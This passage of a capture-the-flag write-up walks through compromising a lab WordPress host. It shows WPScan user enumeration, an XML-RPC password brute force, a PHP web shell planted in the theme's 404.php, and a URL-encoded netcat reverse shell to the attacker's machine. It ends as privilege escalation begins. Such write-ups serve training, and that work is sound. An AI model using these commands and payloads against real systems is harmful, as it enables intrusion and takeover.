 <span style="color:#f92672">|</span>  Login Error Messages (Aggressive Detection)

[<span style="color:#960050;background-color:#1e0010">!</span>] No WPScan API Token given, <span style="color:#66d9ef">as</span> a result vulnerability data has <span style="color:#f92672">not</span> been output<span style="color:#f92672">.</span>
[<span style="color:#960050;background-color:#1e0010">!</span>] You can get a free API token <span style="color:#66d9ef">with</span> <span style="color:#ae81ff">25</span> daily requests by registering at https:<span style="color:#f92672">//</span>wpscan<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>register

[<span style="color:#f92672">+</span>] Finished: Wed Apr  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">39</span> <span style="color:#ae81ff">2021</span>
[<span style="color:#f92672">+</span>] Requests Done: <span style="color:#ae81ff">13</span>
[<span style="color:#f92672">+</span>] Cached Requests: <span style="color:#ae81ff">48</span>
[<span style="color:#f92672">+</span>] Data Sent: <span style="color:#ae81ff">3.457</span> KB
[<span style="color:#f92672">+</span>] Data Received: <span style="color:#ae81ff">9.149</span> KB
[<span style="color:#f92672">+</span>] Memory used: <span style="color:#ae81ff">167</span> MB
[<span style="color:#f92672">+</span>] Elapsed time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">03</span>
</code></pre></div><p>We can see that <code>admin</code> user exists in the application. Let&rsquo;s use <code>rockyou.txt</code> wordlist for bruteforcing.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#960050;background-color:#1e0010">â”Œâ”€â”€</span>(root<span style="color:#960050;background-color:#1e0010">ðŸ’€</span>b0x)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>hgfs<span style="color:#f92672">/</span>THM<span style="color:#f92672">/</span>Internal]                                                                                                                                                                   [<span style="color:#ae81ff">475</span><span style="color:#f92672">/</span><span style="color:#ae81ff">528</span>]
<span style="color:#960050;background-color:#1e0010">â””â”€</span><span style="color:#75715e"># wpscan --url http://internal.thm/blog/ -v -e u -P /usr/share/wordlists/rockyou.txt -t 500                                                                                                                  2 â¨¯</span>
_______________________________________________________________                                          
         __          _______   _____                                                                                                                                                                               
         \ \        <span style="color:#f92672">/</span> <span style="color:#f92672">/</span>  __ \ <span style="color:#f92672">/</span> ____<span style="color:#f92672">|</span>                                                                                                                                                                              
          \ \  <span style="color:#f92672">/</span>\  <span style="color:#f92672">/</span> <span style="color:#f92672">/|</span> <span style="color:#f92672">|</span>__) <span style="color:#f92672">|</span> (___   ___  __ _ _ __ <span style="color:#960050;background-color:#1e0010">Â®</span>                                                   
           \ \<span style="color:#f92672">/</span>  \<span style="color:#f92672">/</span> <span style="color:#f92672">/</span> <span style="color:#f92672">|</span>  ___<span style="color:#f92672">/</span> \___ \ <span style="color:#f92672">/</span> __<span style="color:#f92672">|/</span> _<span style="color:#960050;background-color:#1e0010">`</span> <span style="color:#f92672">|</span> <span style="color:#e6db74">&#39;_ \                                                    </span>
            \  <span style="color:#f92672">/</span>\  <span style="color:#f92672">/</span>  <span style="color:#f92672">|</span> <span style="color:#f92672">|</span>     ____) <span style="color:#f92672">|</span> (__<span style="color:#f92672">|</span> (_<span style="color:#f92672">|</span> <span style="color:#f92672">|</span> <span style="color:#f92672">|</span> <span style="color:#f92672">|</span> <span style="color:#f92672">|</span>
             \<span style="color:#f92672">/</span>  \<span style="color:#f92672">/</span>   <span style="color:#f92672">|</span>_<span style="color:#f92672">|</span>    <span style="color:#f92672">|</span>_____<span style="color:#f92672">/</span> \___<span style="color:#f92672">|</span>\__,_<span style="color:#f92672">|</span>_<span style="color:#f92672">|</span> <span style="color:#f92672">|</span>_<span style="color:#f92672">|</span>

         WordPress Security Scanner by the WPScan Team
                         Version <span style="color:#ae81ff">3.8</span><span style="color:#f92672">.</span><span style="color:#ae81ff">17</span>
       Sponsored by Automattic <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>automattic<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>
       <span style="color:#a6e22e">@_WPScan_</span>, <span style="color:#a6e22e">@ethicalhack3r</span>, <span style="color:#a6e22e">@erwan_lr</span>, <span style="color:#a6e22e">@firefart</span>
_______________________________________________________________

[<span style="color:#f92672">+</span>] URL: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span> [<span style="color:#ae81ff">10.10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">25.58</span>]
[<span style="color:#f92672">+</span>] Started: Wed Apr  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">25</span> <span style="color:#ae81ff">2021</span>

Interesting Finding(s):

[<span style="color:#f92672">+</span>] Headers
 <span style="color:#f92672">|</span> Interesting Entry: Server: Apache<span style="color:#f92672">/</span><span style="color:#ae81ff">2.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">29</span> (Ubuntu) 
 <span style="color:#f92672">|</span> Found By: Headers (Passive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>

[<span style="color:#f92672">+</span>] XML<span style="color:#f92672">-</span>RPC seems to be enabled: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>xmlrpc<span style="color:#f92672">.</span>php
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>
 <span style="color:#f92672">|</span> References:
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>codex<span style="color:#f92672">.</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>XML<span style="color:#f92672">-</span>RPC_Pingback_API
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_ghost_scanner<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>dos<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_xmlrpc_dos<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_xmlrpc_login<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>rapid7<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>db<span style="color:#f92672">/</span>modules<span style="color:#f92672">/</span>auxiliary<span style="color:#f92672">/</span>scanner<span style="color:#f92672">/</span>http<span style="color:#f92672">/</span>wordpress_pingback_access<span style="color:#f92672">/</span>

[<span style="color:#f92672">+</span>] WordPress readme found: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>readme<span style="color:#f92672">.</span>html
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">100</span><span style="color:#f92672">%</span>

[<span style="color:#f92672">+</span>] The external WP<span style="color:#f92672">-</span>Cron seems to be enabled: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>cron<span style="color:#f92672">.</span>php
 <span style="color:#f92672">|</span> Found By: Direct Access (Aggressive Detection)
 <span style="color:#f92672">|</span> Confidence: <span style="color:#ae81ff">60</span><span style="color:#f92672">%</span>
 <span style="color:#f92672">|</span> References:
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>iplocation<span style="color:#f92672">.</span>net<span style="color:#f92672">/</span>defend<span style="color:#f92672">-</span>wordpress<span style="color:#f92672">-</span>from<span style="color:#f92672">-</span>ddos
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> https:<span style="color:#f92672">//</span>github<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>wpscanteam<span style="color:#f92672">/</span>wpscan<span style="color:#f92672">/</span>issues<span style="color:#f92672">/</span><span style="color:#ae81ff">1299</span>

[<span style="color:#f92672">+</span>] WordPress version <span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span> identified (Insecure, released on <span style="color:#ae81ff">2020</span><span style="color:#f92672">-</span><span style="color:#ae81ff">06</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">.</span>
 <span style="color:#f92672">|</span> Found By: Rss Generator (Passive Detection)
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>feed<span style="color:#f92672">/</span>, <span style="color:#f92672">&lt;</span>generator<span style="color:#f92672">&gt;</span>https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>v<span style="color:#f92672">=</span><span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;/</span>generator<span style="color:#f92672">&gt;</span>                                                                                                     [<span style="color:#ae81ff">426</span><span style="color:#f92672">/</span><span style="color:#ae81ff">528</span>]
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>comments<span style="color:#f92672">/</span>feed<span style="color:#f92672">/</span>, <span style="color:#f92672">&lt;</span>generator<span style="color:#f92672">&gt;</span>https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>v<span style="color:#f92672">=</span><span style="color:#ae81ff">5.4</span><span style="color:#f92672">.</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&lt;/</span>generator<span style="color:#f92672">&gt;</span>

[<span style="color:#f92672">+</span>] WordPress theme <span style="color:#f92672">in</span> use: twentyseventeen
 <span style="color:#f92672">|</span> Location: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span> Last Updated: <span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">09</span>T00:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00.000</span>Z
 <span style="color:#f92672">|</span> Readme: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>readme<span style="color:#f92672">.</span>txt
 <span style="color:#f92672">|</span> [<span style="color:#960050;background-color:#1e0010">!</span>] The version <span style="color:#f92672">is</span> out of date, the latest version <span style="color:#f92672">is</span> <span style="color:#ae81ff">2.6</span>
 <span style="color:#f92672">|</span> Style URL: http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>style<span style="color:#f92672">.</span>css<span style="color:#960050;background-color:#1e0010">?</span>ver<span style="color:#f92672">=</span><span style="color:#ae81ff">20190507</span>
 <span style="color:#f92672">|</span> Style Name: Twenty Seventeen
 <span style="color:#f92672">|</span> Style URI: https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span> Description: Twenty Seventeen brings your site to life <span style="color:#66d9ef">with</span> header video <span style="color:#f92672">and</span> immersive featured images<span style="color:#f92672">.</span> With a focus on business sites, it features multiple sections on the front page <span style="color:#66d9ef">as</span> well <span style="color:#66d9ef">as</span> widgets, navi
gation <span style="color:#f92672">and</span> social menus, a logo, <span style="color:#f92672">and</span> more<span style="color:#f92672">.</span> Personalize its asymmetrical grid <span style="color:#66d9ef">with</span> a custom color scheme <span style="color:#f92672">and</span> showcase your multimedia content <span style="color:#66d9ef">with</span> post formats<span style="color:#f92672">.</span> Our default theme <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">2017</span> works great <span style="color:#f92672">in</span> many lang
uages, <span style="color:#66d9ef">for</span> any abilities, <span style="color:#f92672">and</span> on any device<span style="color:#f92672">.</span>
 <span style="color:#f92672">|</span> Author: the WordPress team
 <span style="color:#f92672">|</span> Author URI: https:<span style="color:#f92672">//</span>wordpress<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>
 <span style="color:#f92672">|</span> License: GNU General Public License v2 <span style="color:#f92672">or</span> later
 <span style="color:#f92672">|</span> License URI: http:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>gnu<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>licenses<span style="color:#f92672">/</span>gpl<span style="color:#f92672">-</span><span style="color:#ae81ff">2.0</span><span style="color:#f92672">.</span>html
 <span style="color:#f92672">|</span> Tags: one<span style="color:#f92672">-</span>column, two<span style="color:#f92672">-</span>columns, right<span style="color:#f92672">-</span>sidebar, flexible<span style="color:#f92672">-</span>header, accessibility<span style="color:#f92672">-</span>ready, custom<span style="color:#f92672">-</span>colors, custom<span style="color:#f92672">-</span>header, custom<span style="color:#f92672">-</span>menu, custom<span style="color:#f92672">-</span>logo, editor<span style="color:#f92672">-</span>style, featured<span style="color:#f92672">-</span>images, footer<span style="color:#f92672">-</span>widgets, post<span style="color:#f92672">-</span>formats, rtl<span style="color:#f92672">-</span>lan
guage<span style="color:#f92672">-</span>support, sticky<span style="color:#f92672">-</span>post, theme<span style="color:#f92672">-</span>options, threaded<span style="color:#f92672">-</span>comments, translation<span style="color:#f92672">-</span>ready
 <span style="color:#f92672">|</span> Text Domain: twentyseventeen
 <span style="color:#f92672">|</span>
 <span style="color:#f92672">|</span> Found By: Css Style In Homepage (Passive Detection)
 <span style="color:#f92672">|</span>
 <span style="color:#f92672">|</span> Version: <span style="color:#ae81ff">2.3</span> (<span style="color:#ae81ff">80</span><span style="color:#f92672">%</span> confidence)
 <span style="color:#f92672">|</span> Found By: Style (Passive Detection)
 <span style="color:#f92672">|</span>  <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>content<span style="color:#f92672">/</span>themes<span style="color:#f92672">/</span>twentyseventeen<span style="color:#f92672">/</span>style<span style="color:#f92672">.</span>css<span style="color:#960050;background-color:#1e0010">?</span>ver<span style="color:#f92672">=</span><span style="color:#ae81ff">20190507</span>, Match: <span style="color:#e6db74">&#39;Version: 2.3&#39;</span>

[<span style="color:#f92672">+</span>] Enumerating Users (via Passive <span style="color:#f92672">and</span> Aggressive Methods)
 Brute Forcing Author IDs <span style="color:#f92672">-</span> Time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">04</span> <span style="color:#f92672">&lt;=====================================================================================================================================&gt;</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>) <span style="color:#ae81ff">100.00</span><span style="color:#f92672">%</span> Time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">04</span>

[i] User(s) Identified:

[<span style="color:#f92672">+</span>] admin
 <span style="color:#f92672">|</span> Found By: Author Posts <span style="color:#f92672">-</span> Author Pattern (Passive Detection)
 <span style="color:#f92672">|</span> Confirmed By:
 <span style="color:#f92672">|</span>  Rss Generator (Passive Detection)
 <span style="color:#f92672">|</span>  Wp Json Api (Aggressive Detection)
 <span style="color:#f92672">|</span>   <span style="color:#f92672">-</span> http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span>wp<span style="color:#f92672">-</span>json<span style="color:#f92672">/</span>wp<span style="color:#f92672">/</span>v2<span style="color:#f92672">/</span>users<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>per_page<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&amp;</span>page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
 <span style="color:#f92672">|</span>  Author Id Brute Forcing <span style="color:#f92672">-</span> Author Pattern (Aggressive Detection)
 <span style="color:#f92672">|</span>  Login Error Messages (Aggressive Detection)

[<span style="color:#f92672">+</span>] Performing password attack on Xmlrpc against <span style="color:#ae81ff">1</span> user<span style="color:#f92672">/</span>s
[SUCCESS] <span style="color:#f92672">-</span> admin <span style="color:#f92672">/</span> <span style="color:#f92672">...</span>                                                                              
Trying admin <span style="color:#f92672">/</span> timmy1 Time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">01</span>:<span style="color:#ae81ff">35</span> <span style="color:#f92672">&lt;</span>                                                                                                                                    <span style="color:#f92672">&gt;</span> (<span style="color:#ae81ff">4000</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">14348392</span>)  <span style="color:#ae81ff">0.02</span><span style="color:#f92672">%</span>  ETA: <span style="color:#960050;background-color:#1e0010">??</span>:<span style="color:#960050;background-color:#1e0010">??</span>:<span style="color:#960050;background-color:#1e0010">??</span>
                                                                                                         
[<span style="color:#960050;background-color:#1e0010">!</span>] Valid Combinations Found:                                                                            
 <span style="color:#f92672">|</span> Username: admin, Password: <span style="color:#f92672">...</span>                                                                    
                                                                                                         
[<span style="color:#960050;background-color:#1e0010">!</span>] No WPScan API Token given, <span style="color:#66d9ef">as</span> a result vulnerability data has <span style="color:#f92672">not</span> been output<span style="color:#f92672">.</span>                       
[<span style="color:#960050;background-color:#1e0010">!</span>] You can get a free API token <span style="color:#66d9ef">with</span> <span style="color:#ae81ff">25</span> daily requests by registering at https:<span style="color:#f92672">//</span>wpscan<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>register    
                                                                                                         
[<span style="color:#f92672">+</span>] Finished: Wed Apr  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">11</span>:<span style="color:#ae81ff">21</span> <span style="color:#ae81ff">2021</span>                                                                   
[<span style="color:#f92672">+</span>] Requests Done: <span style="color:#ae81ff">4056</span>                                                                                  
[<span style="color:#f92672">+</span>] Cached Requests: <span style="color:#ae81ff">7</span>                                                                                   
[<span style="color:#f92672">+</span>] Data Sent: <span style="color:#ae81ff">2.022</span> MB                                                                                  
[<span style="color:#f92672">+</span>] Data Received: <span style="color:#ae81ff">2.759</span> MB                                                                              
[<span style="color:#f92672">+</span>] Memory used: <span style="color:#ae81ff">186.539</span> MB                                                                              
[<span style="color:#f92672">+</span>] Elapsed time: <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">01</span>:<span style="color:#ae81ff">55</span>                                                                               
</code></pre></div><p>Got hit around <code>4000</code> tries, we get credentials of the user <code>admin</code></p>
<p><code>admin:...</code></p>
<hr>
<h3 id="exploitation">Exploitation</h3>
<p>Let&rsquo;s now try and login and get reverse shell on our machine. I&rsquo;ll be editing the theme file (404.php) and add the following for rce:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
	
<span style="color:#a6e22e">system</span>($_GET[<span style="color:#ae81ff">123</span>]);

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>Added the snippet for getting RCE</p>
<p><img src="/img/internal-thm/Pasted%20image%2020210407142240.png" alt=""></p>
<p>Now, we need to visit a 404 page on the application to get RCE! We do so by finding a legit blog post and just changing the URL.</p>
<h4 id="rce">RCE</h4>
<p><img src="/img/internal-thm/Pasted%20image%2020210407142220.png" alt=""></p>
<h4 id="reverse-shell-time">Reverse Shell time!</h4>
<p>Alright, time to get reverse shell, let&rsquo;s see if we&rsquo;ve <code>nc</code> on the host. Can do so by using <code>which</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">which nc
</code></pre></div><p><img src="/img/internal-thm/Pasted%20image%2020210407142400.png" alt=""></p>
<p>Alright, <code>nc</code> exists. We can utilize the following to get reverse shell:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rm <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>f;mkfifo <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>f;cat <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>f<span style="color:#f92672">|/</span>bin<span style="color:#f92672">/</span>bash <span style="color:#f92672">-</span>i <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">1</span><span style="color:#f92672">|</span>nc <span style="color:#ae81ff">10.17</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.120</span> <span style="color:#ae81ff">4444</span> <span style="color:#f92672">&gt;/</span>tmp<span style="color:#f92672">/</span>f
</code></pre></div><p>Let&rsquo;s URL encode it before using, since due to <code>&amp;</code> the payload might not execute. We can use cyberchef for doing so.</p>
<p><img src="/img/internal-thm/Pasted%20image%2020210407142522.png" alt=""></p>
<p>Remember to encode all special characters as well!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">rm<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bmkfifo<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bcat<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>C<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Fbin<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Fbash<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Di<span style="color:#f92672">%</span><span style="color:#ae81ff">202</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>E<span style="color:#f92672">%</span><span style="color:#ae81ff">261</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Cnc<span style="color:#f92672">%</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E17</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E120</span><span style="color:#f92672">%</span><span style="color:#ae81ff">204444</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>E<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff
</code></pre></div><p>Let&rsquo;s get RCE now, first start listener on local <code>4444</code> port.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">http:<span style="color:#f92672">//</span>internal<span style="color:#f92672">.</span>thm<span style="color:#f92672">/</span>blog<span style="color:#f92672">/</span>index<span style="color:#f92672">.</span>php<span style="color:#f92672">/</span><span style="color:#ae81ff">2020</span><span style="color:#f92672">/</span><span style="color:#ae81ff">08</span><span style="color:#f92672">/</span><span style="color:#ae81ff">04</span><span style="color:#f92672">/</span>hello<span style="color:#f92672">-</span>world<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span><span style="color:#ae81ff">123</span><span style="color:#f92672">=</span>rm<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bmkfifo<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>Bcat<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff<span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>C<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Fbin<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Fbash<span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Di<span style="color:#f92672">%</span><span style="color:#ae81ff">202</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>E<span style="color:#f92672">%</span><span style="color:#ae81ff">261</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span>Cnc<span style="color:#f92672">%</span><span style="color:#ae81ff">2010</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E17</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2E120</span><span style="color:#f92672">%</span><span style="color:#ae81ff">204444</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span>E<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ftmp<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span>Ff
</code></pre></div><p>Got reverse shell! Beautified and made it interactive as well.</p>
<p><img src="/img/internal-thm/Pasted%20image%2020210407142759.png" alt=""></p>
<hr>
<h3 id="privileges-escalation">Privileges Escalation</h3>
<p>Alright, we got shell as <code>www-data</code> user and can&rsquo;t really find any flags. Also, there&rsquo;s a user in <code>/home/aubreanna</code></p>
<p>Looking at the processes we can see that it has one <strong>java</strong> service running:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">www<span style="color:#f92672">-</span>data<span style="color:#a6e22e">@internal</span>:<span style="color:#f92672">/</span>var<span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html<span style="color:#f92672">/</span>wordpress<span style="color:#960050;background-color:#1e0010">$</span> ps aux <span style="color:#f92672">|</span> grep aubrean
aubrean<span style="color:#f92672">+</span>  <span style="color:#ae81ff">1540</span>  <span style="color:#ae81ff">0.0</span>  <span style="color:#ae81ff">0.0</span>   <span style="color:#ae81ff">1148</span>     <span style="color:#ae81ff">4</span> <span style="color:#960050;background-color:#1e0010">?</span>        Ss   <span style="color:#ae81ff">09</span>:<span style="color:#ae81ff">07</span>   <span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">00</span> <span style="color:#f92672">/</span>sbin<span style="color:#f92672">/</span>tini <span style="color:#f92672">--</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>jenkins<span style="color:#f92672">.</span>sh
